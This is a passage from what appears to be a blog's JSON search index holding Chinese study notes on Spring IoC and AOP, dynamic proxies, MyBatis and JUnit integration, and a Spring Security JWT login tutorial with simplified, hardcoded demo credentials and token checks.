@Qualifier\n\n​\t如果同类型的bean在容器中同时存在多个，则用@AutoWired则会出现错误，此时应该使用@Qualifier注解来指定bean的名字进行注\t入，**此注解不能单独使用**\n\n## XML配置文件相关注解\n\n### @Configuration\n\n​\t标注在类上，表示当前类是一个配置类，可以用注解类完全替换XML配置文件\n\n​\t另外，如果使用了配置类替换XML配置，Spring容器要使用AnnotationConfigApplicationContext\n\n```java\npublic class Main {\n    public static void main(String[] args){\n        //ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext(\"applicationContext.xml\");\n        AnnotationConfigApplicationContext annotationConfigApplicationContext = new AnnotationConfigApplicationContext(config.class);\n        Test test = (Test) annotationConfigApplicationContext.getBean(\"TestImp\");\n        test.print();\n    }\n```\n\n\n\n### @ComponentScan\n\n​\t用于代替context:component-scan标签来配置组件扫描\n\n```java\npackage com.Config;\n\nimport org.springframework.context.annotation.ComponentScan;\nimport org.springframework.context.annotation.Configuration;\n\n@Configuration\n@ComponentScan(basePackages = \"com\")\npublic class config {\n}\n```\n\n\n\n### @Bean\n\n​\t用于代替bean标签，用于第三方类的注入\n\n ### @PropertySource\n\n​\t用于代替context:property-placeholder，让Spring读取指定的properties文件，\n\n然后使用@Value注解来读取值\n\n# Spring-AOP\n\n## AOP\n\n### 概念\n\n​\tAspect Oriented Programming的缩写，意为：面向切面编程。\n\n​\t**SpringAOP：批量对Srping容器中的bean的方法做增强，并且这种增强不会对原来方法中的代码耦合**\n\n### 案例\n\n①：添加依赖\n\n​\t必须同时包含SpringIOC的依赖和AOP的依赖\n\n```xml\n<!--SpringIOC相关依赖-->\n<dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-context</artifactId>\n    <version>5.1.9.RELEASE</version>\n</dependency>\n<!--SpringAOP相关依赖-->\n<dependency>\n    <groupId>org.aspectj</groupId>\n    <artifactId>aspectjweaver</artifactId>\n    <version>1.8.13</version>\n</dependency>\n```\n\n**②：开启AOP注解支持**\n\n​\t在xml配置文件中加入\n\n```xml\n<!--开启AOP注解支持-->\n<aop:aspectj-autoproxy></aop:aspectj-autoproxy>\n```\n\n③：准备切面类\n\n在类上加入**@Component***和**@Aspect**\n\n使用**@Pointcut**注解来指定要被增强的方法\n\n使用**@Before**注解来给我们的增强代码所在的方法进行标识，并且指明增强代码实在目标代码方法执行前执行\n\n目标代码\n\n```java\n@Service(\"TestImp\")\npublic class TestImp implements Test{\n    @Override\n    public void print(){\n        System.out.println(\"打印A\");\n    }\n}\n```\n\n```java\n@Component\n@Aspect\npublic class MyAspect {\n    //用Pointcut注解指定目标方法\n    //第一个*号代表任意类型返回值，最后一个*号代表任意方法，(..)代表任意参数\n    @Pointcut(\"execution(* com.Test.TestImp.*(..))\")\n    public void pt(){\n\n    }\n\t//pt()指在此处切入\n    @Before(\"pt()\")\n    public void methoodBefore(){\n        System.out.println(\"切入在目标方法执行之前\");\n    }\n}\n```\n\n## AOP核心概念\n\n* Joinpoint（连接点）：指那些可以被增强到的点，在Spring中，这些点指的是方法，因为Spring只支持方法的增强\n\n* Pointcut（切入点）：指被增强的连接点（方法）\n\n* Advice（通知：增强）：指具体增强的代码\n\n* Target（目标对象）：被增强的对象就是目标对象\n\n* Aspect（切面）：是切入点与通知的结合\n\n* Proxy（代理）：一个类被AOP增强后，就产生一个结果代理类\n\n  \n\n## 切点确定\n\n### 切点表达式\n\n​\t写法：**execution([修饰符] 返回类型 包名.类名.方法名.(参数))**\n\n* 访问修饰符可以省略\n* 返回值类型、包名、类名、方法名可以用***号**代表任意\n* 包名与类名之间一个点**.**代表当前包下的类，两个点**..**标识当前包及其子包下的类\n* 参数可以用两个**..**表示任意个数、任意类型的参数列表\n\n### 切点函数@annotation\n\n写法：**@annotation(注解的全类名)**\n\n实例：\n\n先自定义注解，将自定义注解标注的需要增强的方法上\n\n```java\npackage com.aspect;\n\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n\n@Target(ElementType.METHOD)\t\t//表明该注解可以在哪些地方标注\n@Retention(RetentionPolicy.RUNTIME)\t\t//该注解可以保存到运行时\npublic @interface InvokeLog {\n}\n```\n\n被增强方法\n\n```java\npackage com.Test;\n\n\nimport com.aspect.InvokeLog;\nimport org.springframework.stereotype.Service;\n\n@Service(\"TestImp\")\npublic class TestImp implements Test{\n    //加上该自定义注解\n    @InvokeLog\t\n    @Override\n    public void print(){\n        System.out.println(\"打印A\");\n    }\n}\n\n```\n\n在切面类里使用**@annotation**\n\n```java\n@Component\n@Aspect\npublic class MyAspect {\n    //用Pointcut注解指定目标方法\n    @Pointcut(\"@annotation(com.aspect.InvokeLog)\")\t\t//此处写自定义注解的全类名\n    public void pt(){\n        System.out.println(\"AAA\");\n    }\n\n    @After(\"pt()\")\n    public void methoodBefore(){\n        System.out.println(\"切入在目标方法执行之前\");\n    }\n}\n```\n\n## 通知分类\n\n* @Before：前置通知，在方法执行前执行\n* @AfterReturning：返回后通知，在目标方法执行后执行，如果出现异常不会执行\n* @After：后置通知，在目标方法返回结果之后通知，无论是否异常都会执行\n* @AfterThrowing：异常通知，在目标方法抛出异常后通知\n* **@Around：环绕通知，围绕着方法执行**\n\n环绕通知@Around实例：\n\n被增强的方法：\n\n```java\n@Service(\"TestImp\")\npublic class TestImp implements Test{\n    @Override\n    public void print(){\n        System.out.println(\"打印A\");\n    }\n}\n```\n\n切面类：\n\n```java\n@Component\n@Aspect\npublic class MyAspect {\n    //用Pointcut注解指定目标方法\n    @Pointcut(\"execution(* com.Test.TestImp.*(..))\")\n    public void pt(){\n        System.out.println(\"AAA\");\n    }\n\n    @Around(\"pt()\")\n    public void methoodBefore(ProceedingJoinPoint pjp){\t//该参数指向目标方法\n        System.out.println(\"切入在目标方法执行之前\");\n        try{\n            pjp.proceed();\t\t//目标方法执行\n        }catch(Throwable throdable){\n            throwable.printStackTrace();\n        }\n    }\n}\n```\n\n## 获取被增强方法的相关信息\n\n**JoinPoint**\n\n```java\n@Component\n@Aspect\npublic class MyAspect {\n    //用Pointcut注解指定目标方法\n    @Pointcut(\"@annotation(com.aspect.InvokeLog)\")\n    public void pt(){\n        System.out.println(\"AAA\");\n    }\n\n    @After(\"pt()\")\n    public void methoodBefore(JoinPoint jp){\t//参数包含增强目标的信息\n       Object ta = jp.getTarget();\n        System.out.println(ta);\n    }\n}\n```\n\n## 多切面顺序问题\n\n使用**@Order(1)**\n\n数字越小，优先级越高\n\n# AOP原理-动态代理\n\n\n\n## JDK动态代理\n\n​\tJDK动态代理使用的**java.lang.reflect.Proxy**这个类来实现的。要求被代理（被增强）的类实现了接口。并且JDK代理只能对接口中的方法进行增强。\n\n示例：\n\n```java\npublic class Main {\n    public static void main(String[] args){\n        //使用动态代理增强TestImp中的print方法\n        TestImp testImp = new TestImp();\n        ClassLoader classLoader = Main.class.getClassLoader();\n        Class<?>[] interfaces = TestImp.class.getInterfaces();\n        //prox是代理对象\n        Test prox = (Test) Proxy.newProxyInstance(classLoader, interfaces, new InvocationHandler() {\n            @Override\n            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n                if(method.getName().equals(\"print\")){\n                    System.out.println(\"已经增强\");\n                }\n                method.invoke(testImp,args);\n                return null;\n            }\n        });\n        prox.print();\n    }\n}\n```\n\n## Cglib动态代理\n\n​\t使用的是org.springframework.cglib.proxy.Enhancer类进行实现的\n\n示例：先要导入SpringIOC相关依赖\n\n```java\npublic class Main {\n    public static void main(String[] args){\n        //使用动态代理增强TestImp中的print方法\n        Enhancer enhancer = new Enhancer();\n        //设置父类的字节码对象\n        enhancer.setSuperclass(TestImp.class);\n        enhancer.setCallback(new MethodInterceptor() {\n            @Override\n            public Object intercept(Object o, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable {\n\n                if(method.getName().equals(\"print\")){\n                    System.out.println(\"被增强\");\n                }\n\n                Object ret = methodProxy.invokeSuper(o,objects);\n                return null;\n            }\n        });\n        //生成代理对象\n        TestImp proxy = (TestImp) enhancer.create();\n        proxy.print();\n    }\n}\n```\n\n## 区别\n\nJDK动态代理要求被代理的类必须要实现接口，生成的代理对象相当于被代理对象的兄弟\n\nCglib的动态代理不要求被代理的类实现接口，生成的代理对象相当于被代对象的子类对象\n\nSpring默认情况下使用的是JDK动态代理，当使用不了JDK动态代理才会使用Cglib的动态代理\n\n### 切换动态代理方式\n\n**proxy-target-class**属性为true，则切换至Cglib代理\n\n注解配置\n\n```xml\n<aop:aspectj-autoproxy proxy-target-class=\"true\"></aop:aspectj-autoproxy>\n```\n\nXML配置\n\n```xml\n<aop:config proxy-target-class=\"true\"></aop:config>\n```\n\n# Spring整合Junit\n\n## ①导入依赖\n\n```xml\n<!--        junit-->\n        <dependency>\n            <groupId>junit</groupId>\n            <artifactId>junit</artifactId>\n            <version>4.12</version>\n        </dependency>\n<!--        Spring整合Junit-->\n        <dependency>\n            <groupId>org.springframework</groupId>\n            <artifactId>spring-test</artifactId>\n            <version>5.1.9.RELEASE</version>\n        </dependency>\n```\n\n## ②编写测试类\n\n在测试类上加\n\n**@RunWith(SpringJUnit4ClassRunner.class)**，指定测试运行与Spring环境\n\n**@ContextConfiguration**：指定Spring容器创建需要的配置文件或配置类\n\n```java\n@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(locations = \"classpath:applicationContext.xml\")\n//@ContextConfiguration(classes = config.class)\npublic class SpingTest {\n\n    @Autowired\n    private TestImp testImp;\n\n    @Test\n    public void test(){\n        testImp.print();\n    }\n}\n```\n\n# Spring整合Mybatis\n\n[官方文档]([mybatis-spring –](http://mybatis.org/spring/zh/getting-started.html))\n\n## 导入依赖\n\n```xml\n<!--        spring-jdbc-->\n        <dependency>\n            <groupId>org.springframework</groupId>\n            <artifactId>spring-jdbc</artifactId>\n            <version>5.1.9.RELEASE</version>\n        </dependency>\n        <!--        mybatis整合到Spring的整合包-->\n        <dependency>\n            <groupId>org.mybatis</groupId>\n            <artifactId>mybatis-spring</artifactId>\n            <version>2.0.4</version>\n        </dependency>\n        <!--        mybatis依赖-->\n        <dependency>\n            <groupId>org.mybatis</groupId>\n            <artifactId>mybatis</artifactId>\n            <version>3.5.4</version>\n        </dependency>\n        <!--        mysql驱动-->\n        <dependency>\n            <groupId>mysql</groupId>\n            <artifactId>mysql-connector-java</artifactId>\n            <version>5.1.47</version>\n        </dependency>\n<!--        druid数据源-->\n        <dependency>\n            <groupId>com.alibaba</groupId>\n            <artifactId>druid</artifactId>\n            <version>1.1.16</version>\n        </dependency>\n```\n\n## Spring文件配置\n\n```xml\n<!--读取properties文件-->\n<context:property-placeholder location=\"classpath: jdbc.properties\"></context:property-placeholder>\n\n<!--创建连接池注入容器-->\n<bean class=\"com.alibaba. druid. pool.DruidDataSource\" id=\"dataSource\">\n\t<property name=\"ur1\" value=\"$ {jdbc.ur1]}\"></property>\n\t<property name=\"username\" value=\"$ {jdbc.username}\"</property>\n    <property name=\"password\"value=\"$ {jdbc.password}\"</property>\n\t<property name=\"driverClassName\" value=\"${jdbc.driver}\"></property></bean>\n<bean class=\"org.mybatis.spring.SqlSessionFactoryBean\"id=\"sessionFactoryBean\">\n\t<property name=\"dataSource\" ref=\"dataSource\"</property>\n\t<!--配置mybatis配置文件的路径-->\n\t<property name=\"configLocation\"value=\"classpath:mybatis-config.xml\"</property></bean>\n\n<!--mapper扫描配置，扫描到的mapper对象会被注入Spring容器中-->\n<bean class=\" org.mybatis.spring.mapper. MapperScannerConfigurer\" id=\"mapperScannerConfigurer\">\n\t<property name=\"basePackage\" value=\"com.sangeng.dao\"></property>\n</ bean>\n\n```\n\n# Spring声明式事务\n\n## 事务回顾\n\n概念：保证一组数据库的操作，要么同时成功，要么同时失败\n\n例：A给B转账\n\n​\t\tA的前减少\n\n​\t\tB的钱增加\n\n### 四大特性\n\n* 隔离性\n\n  事务之间相互隔离，成功失败互不影响\n\n* 原子性\n\n  不可分割的整体\n\n* 一致性\n\n  事务前后数据状态一致，要么都成功，要么都失败\n\n* 持久性\n\n  事务被提交，事务对数据的操作就真的发生了变化，即使数据库故障也不会影响\t\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["Spring","Ioc","Aop"]},{"title":"SpringSecurity笔记（未完成）","url":"/2025/01/12/SpringSecurity笔记/","content":"\n# 准备\n\n## 导入SpringSecurity包\n\n由于springsecurity会继承其父工程**springboot**，所以在添加依赖的时候不需要添加版本，有springboot容器自动指定。\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-security</artifactId>\n</dependency>\n```\n\n# 认证\n\n## 登录认证流程\n\n![认证流程](https://cdn.jsdelivr.net/gh/muouren7/PIC/img202211061831436.png)\n\n## spring security认证与校验流程\n\n![认证流程](https://img-blog.csdnimg.cn/20200824163620756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1MjM3NDYzMzU4Mw==,size_16,color_FFFFFF,t_70#pic_center)\n\n![校验流程](https://cdn.jsdelivr.net/gh/muouren7/PIC/img202211102033013.png)\n\n\n\n## 自定义实例\n\n### 添加依赖\n\n```xml\n<!--redis依赖-->\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-data-redis</artifactId>\n</dependency>\n<!--fastjson依赖-->\n<dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>fastjson</artifactId>\n    <version>1.2.33</version>\n</dependency>\n<!--jwt依赖-->\n<dependency>\n    <groupId>io.jsonwebtoken</groupId>\n    <artifactId>jjwt</artifactId>\n    <version>0.9.0</version>\n</dependency>\n```\n\n自定义示例\n\n继承UserDetailsService接口，重写loadUserByUsername方法\n\n流程：只会传入username，需要自己实现通过username对整个用户信息的查询，并将其封装为UserDetails对象，SpringSecurity会根据查询后封装的UserDetails对象中的密码进行判断是否登录成功\n\n```java\n@Service\npublic class UserDetailsServiceImp implements UserDetailsService {\n\n    @Override\n    public UserDetails loadUserByUsername(String s) throws UsernameNotFoundException {\n        if(!s.equals(\"muouren7\")){\n            throw new RuntimeException(\"用户名或密码错误\");\n        }\n        return new LoginUser(s,\"{noop}123456\");\t//{加密方法}加密后的密码\n    }\n}\n```\n\nLoginUser.java\n\n```java\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\npublic class LoginUser implements UserDetails {\n\n    private String username;\n    private String password;\n\n    @Override\n    public Collection<? extends GrantedAuthority> getAuthorities() {\n        return null;\n    }\n\n    @Override\n    public String getPassword() {\n        return this.password;\n    }\n\n    @Override\n    public String getUsername() {\n        return this.username;\n    }\n\n    @Override\n    public boolean isAccountNonExpired() {\n        return true;\n    }\n\n    @Override\n    public boolean isAccountNonLocked() {\n        return true;\n    }\n\n    @Override\n    public boolean isCredentialsNonExpired() {\n        return true;\n    }\n\n    @Override\n    public boolean isEnabled() {\n        return true;\n    }\n}\n```\n\n### 加密存储\n\n​\tSpringSecurity默认在UserDetails中返回的对象里的密码必须按照 **{加密方式}加密后的密码** 的格式进行封装。例如，{noop}12345就表示加密方式为明文，且按照明文的方式加密后的密码是12345，如果不用明文，则需要在往数据库中存入密码前就加密\n\nSpringSecurity自带加密的工具类\n\n需要将其注入Spring容器（注入第三方对象使用@Bean）\n\n```java\n@Configuration\npublic class SecurotyConfig extends WebSecurityConfigurerAdapter {\n    @Bean\n    public PasswordEncoder passwordEncoder(){\n        return new BCryptPasswordEncoder();\n    }\n}\n```\n\n```java\n@SpringBootTest()\npublic class TestDemo {\n\n    @Resource\n    private BCryptPasswordEncoder passwordEncoder;\n\n    @Test\n    public void test(){\n        System.out.println(passwordEncoder.encode(\"123456\"));\n    }\n}\n//$2a$10$VYtMkvhEhrOt6FrisGd45uJJDZ.sUbByrDfSBsLkLB/OEd3g0LZJ6\t\t另外每次加密结果都不同\n```\n\n无需修改验证部分的代码\n\n# 自定义登录接口\n\n## Controller\n\n```java\n@Controller\npublic class Index {\n\n    @Autowired\n    private LoginService loginService;\n\n    @RequestMapping(\"/login\")\n    @ResponseBody\n    public RestRult login(@RequestBody UserInfo userInfo){\n        RestRult<UserInfo> restRult = loginService.login(userInfo);\n        return restRult;\n    }\n}\n```\n\n## Config\n\n```java\n@Configuration\npublic class config extends WebSecurityConfigurerAdapter {\n\n    @Bean\n    public PasswordEncoder passwordEncoder(){\n        return new BCryptPasswordEncoder();\n    }\n\n    @Override\n    protected void configure(HttpSecurity http) throws Exception {\n        //super.configure(http);\n        http\n                //关闭csrf\n                .csrf().disable()\n                //不通过Session获取SecurityContext\n                .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS)\n                .and()\n                .authorizeRequests()\n                //对于登录接口允许匿名访问\n                .antMatchers(\"/login\").anonymous()\n                //除上面的请求，其余全部需要鉴权认证\n                .anyRequest().authenticated();\n    }\n\n    @Bean\n    @Override\n    public AuthenticationManager authenticationManagerBean() throws Exception {\n        return super.authenticationManagerBean();\n    }\n}\n```\n\n## Service\n\n实现**UserDetailsService**接口\n\n```java\n@Service\npublic class UserDetailsServiceImp implements UserDetailsService {\n    @Override\n    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n        UserInfo userInfo = new UserInfo(\"muouren7\",\"$2a$10$VYtMkvhEhrOt6FrisGd45uJJDZ.sUbByrDfSBsLkLB/OEd3g0LZJ6\");\n\n        //这里通过查询数据库查询用户账户密码\n        if(!username.equals(\"muouren7\")){\n            throw new RuntimeException(\"登录错误\");\n        }\n\n        return new LoginUser(userInfo.getUsername(),userInfo.getPassword());\n    }\n}\n```\n\n```java\npublic interface LoginService {\n    RestRult login(UserInfo userInfo);\n}\n```\n\n自定义登录方法（需要），在Controller中调用。\n\n```java\n@Service\npublic class LoginServiceImp implements LoginService{\n\n    @Autowired\n    private AuthenticationManager authenticationManager;\n\n    @Override\n    public RestRult login(UserInfo userInfo) {\n        \n        UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(userInfo.getUsername(),userInfo.getPassword());\n\n        Authentication authenticate = authenticationManager.authenticate(authenticationToken);\n\n        //如果未通过\n        if(Objects.isNull(authenticate)){\n            throw new RuntimeException(\"登录失败\");\n        }\n\n        return new RestRult(200,\"登录成功\",userInfo);\n    }\n}\n```\n\n# 自定义校验过滤\n\n## 添加过滤器\n\n```java\n/*\n* 登录之后每次的请求都会携带Token，\n* 添加过滤器对请求的TOken进行验证\n*\n* 这里使用的Sprin提供的过滤器接口，\n* 默认的过滤器接口可能出现一次请求会调用多次\n* */\n@Component\npublic class JwtFilter extends OncePerRequestFilter {\n    @Override\n    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {\n        //获取Token\n        String token = request.getHeader(\"token\");\n        if(!StringUtils.hasText(token)){\n            filterChain.doFilter(request,response);\n            return;\n        }\n        //解析Token  如果解析失败，抛出异常 throw new RuntimeException(\"token无效\");\n        //解析成功，从Redis中获取用户信息 LoginUser\n\n        if(token.equals(\"111\")){\n            throw new RuntimeException(\"token无效\");\n        }\n\n        LoginUser loginUser = new LoginUser(\"muouren7\",\"$2a$10$VYtMkvhEhrOt6FrisGd45uJJDZ.sUbByrDfSBsLkLB/OEd3g0LZJ6\");\n\n        //存放SecurityContextHolder\n        UsernamePasswordAuthenticationToken usernamePasswordAuthenticationToken = new UsernamePasswordAuthenticationToken(loginUser, null, null);\n        SecurityContextHolder.getContext().setAuthentication(usernamePasswordAuthenticationToken);\n\n        //放行\n        filterChain.doFilter(request,response);\n    }\n}\n```\n\n## 配置过滤器认证\n\n将自定义的token校验添加到过滤器链中\n\n```java\n@Configuration\npublic class config extends WebSecurityConfigurerAdapter {\n\n    @Autowired\n    private JwtFilter jwtFilter;\n\n    @Bean\n    public PasswordEncoder passwordEncoder(){\n        return new BCryptPasswordEncoder();\n    }\n\n    @Override\n    protected void configure(HttpSecurity http) throws Exception {\n        //super.configure(http);\n        http\n                //关闭csrf\n                .csrf().disable()\n                //不通过Session获取SecurityContext\n                .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS)\n                .and()\n                .authorizeRequests()\n                //对于登录接口允许匿名访问\n                .antMatchers(\"/login\").anonymous()\n                //除上面的请求，其余全部需要鉴权认证\n                .anyRequest().authenticated();\n        http.addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class);//将token过滤器加入到过滤器链中\n    }\n\n    @Bean\n    @Override\n    public AuthenticationManager authenticationManagerBean() throws Exception {\n        return super.authenticationManagerBean();\n    }\n\n\n}\n```\n\n# 退出登录\n\n​\t 如果按照上述的方式将Token存入Redis并且在每次请求前验证Token，将权限信息存入SecurityContextHoder的方法。那么退出登录需要将Redis中的Token清除且新建一个Token未失效的黑名单，另外退出登录的接口不能是**/logout**，因为/logout已经被SpringSecurity占用，会被拦截。\n\n```java\n@Service\npublic class LoginServiceImp implements LoginService{\n\n    @Autowired\n    private AuthenticationManager authenticationManager;\n\n    @Override\n    public RestRult logout() {\n        //获取SecurityContextHoder中的用户信息，每一次有效请求都会往SecurityContextHoder存入信息\n        //注销Token\n        System.out.println(\"aaaa\");\n        return new RestRult(200,\"退出成功\",new LoginUser(\"muouren7\",\"123456\"));\n    }\n\n\n}\n```\n\n```java\n@Controller\npublic class Index {\n\n    @Autowired\n    private LoginService loginService;\n\n    @RequestMapping(\"/user/logout\")\n    @ResponseBody\n    public RestRult logout(){\n        return loginService.logout();\n    }\n}\n```\n\n# 授权\n\n​\t开启授权注解配置，在配置类中开启\n\n```java\n@EnableGlobalMethodSecurity(prePostEnabled = true)\n```\n\n```java\n@Controller\npublic class Index {\n\n    @Autowired\n    private LoginService loginService;\n\n    @RequestMapping(\"/test\")\n    @PreAuthorize(\"hasAuthority('test')\")\t//写入所需要的权限\n    @ResponseBody\n    public RestRult test(){\n        return loginService.logout();\n    }\n\n\n}\n```\n\n登录时放入权限（也可以不放，登录不需要权限验证就可以不放）\n\n```java\n@Service\npublic class UserDetailsServiceImp implements UserDetailsService {\n    @Override\n    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n        UserInfo userInfo = new UserInfo(\"muouren7\",\"$2a$10$VYtMkvhEhrOt6FrisGd45uJJDZ.sUbByrDfSBsLkLB/OEd3g0LZJ6\");\n\n        //这里通过查询数据库查询用户账户密码\n        if(!username.equals(\"muouren7\")){\n            throw new RuntimeException(\"登录错误\");\n        }\n\n\n        Collection<SimpleGrantedAuthority> collection = new ArrayList<>();\n        collection.add(new SimpleGrantedAuthority(\"test\"));\t\t\t//名为test的权限\n        return new LoginUser(userInfo.getUsername(),userInfo.getPassword(),collection);\n    }\n\n\n}\n```\n\n过滤器里验证时需要存入权限\n\n```java\n@Component\npublic class JwtFilter extends OncePerRequestFilter {\n    @Override\n    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {\n        //获取Token\n        String token = request.getHeader(\"token\");\n        if(!StringUtils.hasText(token)){\n            filterChain.doFilter(request,response);\n            return;\n        }\n        System.out.println(token);\n        //解析Token  如果解析失败，抛出异常 throw new RuntimeException(\"token无效\");\n        //解析成功，从Redis中获取用户信息 LoginUser\n\n        if(token.equals(\"111\")){\n            throw new RuntimeException(\"token无效\");\n        }\n\n        Collection<SimpleGrantedAuthority> collection = new ArrayList<>();\n        collection.add(new SimpleGrantedAuthority(\"test\"));\n        LoginUser loginUser = new LoginUser(\"muouren7\",\"$2a$10$VYtMkvhEhrOt6FrisGd45uJJDZ.sUbByrDfSBsLkLB/OEd3g0LZJ6\",collection);\t//放入权限，这里是把权限写死了的\n\n        //存放SecurityContextHolder\n        UsernamePasswordAuthenticationToken usernamePasswordAuthenticationToken = new UsernamePasswordAuthenticationToken(loginUser, null, collection   );\n        SecurityContextHolder.getContext().setAuthentication(usernamePasswordAuthenticationToken);\n\n        //放行\n        filterChain.doFilter(request,response);\n    }\n}\n```\n\n过滤器中存入的权限，在访问接口时会与接口**@PreAuthorize**注解所规定的权限进行比较\n\n# 自定义失败处理\n\n​\t在SpringSecurity中，如果我们在认证或者授权的过程中出现了异常会被ExceptionTranslationFilter捕获到。在ExceptionTranslationFilter中会去判断是认证失败还是授权失败出现的异常。\n\n​\t如果是认证过程中出现的异常会被封装成AuthenticationExieption然后调用**AuthenticationEntryPoint**对象的方法去进行异常处理。\t\n\n​\t如果是授权过程中出现的异常会被封装成AccessDeniedException然后调用AccessDeniedHandler对象的方法去进行异常处理。\n\n所以如果我们需要自定义异常处理，我们只需要自定义AuthenticationEntryPoint和AcessDeniedHandler然后配置给SpringSecurity即可。\n\n## 实现类\n\n```java\n@Component\npublic class AuthenticationEntryPointImp implements AuthenticationEntryPoint {\n    @Override\n    public void commence(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, AuthenticationException e) throws IOException, ServletException {\n          //处理异常\n        try{\n            httpServletResponse.setStatus(200);\n            httpServletResponse.setContentType(\"application/json\");\n            httpServletResponse.setCharacterEncoding(\"utf-8\");\n            RestRult<String> restRult = new RestRult<>(HttpStatus.UNAUTHORIZED.value(), \"认证失败\",\"\");\n            httpServletResponse.getWriter().write(restRult.toString());\n        }catch (Exception x){\n            x.printStackTrace();\n        }\n\n    }\n}\n```\n\n```java\n@Component\npublic class AccessDeniedHandlerImp implements AccessDeniedHandler {\n    @Override\n    public void handle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, AccessDeniedException e) throws IOException, ServletException {\n        //处理异常\n        try{\n            httpServletResponse.setStatus(200);\n            httpServletResponse.setContentType(\"application/json\");\n            httpServletResponse.setCharacterEncoding(\"utf-8\");\n            RestRult<String> restRult = new RestRult<>(HttpStatus.UNAUTHORIZED.value(), \"授权失败\",\"\");\n            httpServletResponse.getWriter().write(restRult.toString());\n        }catch (Exception x){\n            x.printStackTrace();\n        }\n    }\n}\n```\n\n## 配置，添加异常处理器\n\n```java\n@Configuration\n@EnableGlobalMethodSecurity(prePostEnabled = true)\npublic class config extends WebSecurityConfigurerAdapter {\n\n    @Autowired\n    private JwtFilter jwtFilter;\n    @Autowired\n    private AuthenticationEntryPointImp authenticationEntryPointImp;\n    @Autowired\n    private AccessDeniedHandlerImp accessDeniedHandlerImp;\n\n    @Bean\n    public PasswordEncoder passwordEncoder(){\n        return new BCryptPasswordEncoder();\n    }\n\n    @Override\n    protected void configure(HttpSecurity http) throws Exception {\n        //super.configure(http);\n        http\n                //关闭csrf\n                .csrf().disable()\n                //不通过Session获取SecurityContext\n                .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS)\n                .and()\n                .authorizeRequests()\n                //对于登录接口允许匿名访问\n                .antMatchers(\"/login\").anonymous()\n                //除上面的请求，其余全部需要鉴权认证\n                .anyRequest().authenticated();\n        //添加过滤器\n        http.addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class);\n        //添加异常处理器\n        http\n                .exceptionHandling()\n                .authenticationEntryPoint(authenticationEntryPointImp)\n                .accessDeniedHandler(accessDeniedHandlerImp);\n    }\n\n    @Bean\n    @Override\n    public AuthenticationManager authenticationManagerBean() throws Exception {\n        return super.authenticationManagerBean();\n    }\n\n\n}\n```\n\n# 跨域\n\n​\t除了配置SpringBoot本身的跨域，还需要配置SpringSecurity的跨域\n\n```java\n@Configuration\n@EnableGlobalMethodSecurity(prePostEnabled = true)\npublic class config extends WebSecurityConfigurerAdapter {\n\n    @Autowired\n    private JwtFilter jwtFilter;\n    @Autowired\n    private AuthenticationEntryPointImp authenticationEntryPointImp;\n    @Autowired\n    private AccessDeniedHandlerImp accessDeniedHandlerImp;\n\n    @Bean\n    public PasswordEncoder passwordEncoder(){\n        return new BCryptPasswordEncoder();\n    }\n\n    @Override\n    protected void configure(HttpSecurity http) throws Exception {\n        //super.configure(http);\n        http\n                //关闭csrf\n                .csrf().disable()\n                //不通过Session获取SecurityContext\n                .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS)\n                .and()\n                .authorizeRequests()\n                //对于登录接口允许匿名访问\n                .antMatchers(\"/login\").anonymous()\n                //除上面的请求，其余全部需要鉴权认证\n                .anyRequest().authenticated();\n        //添加过滤器\n        http.addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class);\n        //添加异常处理器\n        http\n                .exceptionHandling()\n                .authenticationEntryPoint(authenticationEntryPointImp)\n                .accessDeniedHandler(accessDeniedHandlerImp);\n        //允许跨域\n        http\n                .cors();\n    }\n\n    @Bean\n    @Override\n    public AuthenticationManager authenticationManagerBean() throws Exception {\n        return super.authenticationManagerBean();\n    }\n\n\n}\n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["SpringSecurity"]},{"title":"SpringCloud笔记（更新ing）","url":"/2025/01/12/SpringCloud笔记（更新ing）/","content":"\n# SpringCloud\n\nEureka\t-\t用于服务的注册于发现，对每个服务进行集中管理\n\n~~Ribbon~~（已经凉了，现已被LoadBalancer取代）\t-\t为服务之间相互调用提供负载均衡算法\n\nHystrix\t-\t断路器，系统出现故障时防止故障进一步扩张\n\n~~Zuul~~\t(已凉，现被Gateway取代)\t-\tapi网关，决定将请求转发给哪一个微服务。\n\nConfig\t-\t配置管理，可以实现配置文件的集中管理\t\n\n[SpringCloud官网](https://spring.io/projects/spring-cloud)\n\n## Eureka注册中心\n\n[Eureka官网文档](https://docs.spring.io/spring-cloud-netflix/docs/current/reference/html)\n\n\n\n## LoadBalancer负载均衡\n\n为服务之间的调用提供负载均衡算法","tags":["笔记","SpringCloud"]},{"title":"SpringBoot笔记（未完成）","url":"/2025/01/12/SpringBoot笔记（未完成）/","content":"\n# SpringBoot笔记\n\n[官方文档]([Spring 